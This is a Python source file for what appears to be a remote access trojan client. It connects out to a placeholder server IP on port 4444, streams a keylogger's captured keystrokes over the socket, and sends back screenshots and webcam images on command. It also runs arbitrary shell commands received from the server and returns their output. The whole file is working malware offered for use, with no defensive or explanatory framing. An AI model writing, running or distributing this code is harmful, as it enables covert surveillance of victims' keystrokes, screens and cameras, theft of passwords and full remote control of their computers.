import socket
import subprocess
import os
import pyautogui
import cv2
import threading
from pynput import keyboard

# Keylogger function
log = ""

def keylogger(client_socket):
    global log
    def on_press(key):
        global log
        try:
            log += key.char
        except AttributeError:
            log += f'[{key.name}]'
        
        # Send logs periodically instead of every keystroke
        if len(log) > 10:  # Adjust the buffer size as needed
            client_socket.sendall(log.encode())
            log = ""  # Clear log after sending

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

# Screenshot function
def take_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")
    with open("screenshot.png", "rb") as f:
        return f.read()

# Webcam capture function
def capture_webcam():
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if ret:
        cv2.imwrite("webcam.jpg", frame)
        with open("webcam.jpg", "rb") as f:
            return f.read()
    return b""

# Function to connect to the server and receive commands
def connect_to_server(server_ip, server_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        client.connect((server_ip, server_port))
        print("[*] Connected to server")
        
        # Start keylogger in a separate thread
        threading.Thread(target=keylogger, args=(client,), daemon=True).start()

        while True:
            command = client.recv(1024).decode()
            
            if command.lower() == "exit":
                break
            elif command == "screenshot":
                client.send(take_screenshot())
            elif command == "webcam":
                client.send(capture_webcam())
            else:
                output = subprocess.run(command, shell=True, capture_output=True, text=True)
                client.send(output.stdout.encode() if output.stdout else b"No output\n")

    except Exception as e:
        print(f"Connection error: {e}")
    
    finally:
        client.close()

if __name__ == "__main__":
    SERVER_IP = "YOUR_SERVER_IP_HERE"  # Change this to your server's IP
    SERVER_PORT = 4444  # Must match the server port
    connect_to_server(SERVER_IP, SERVER_PORT)
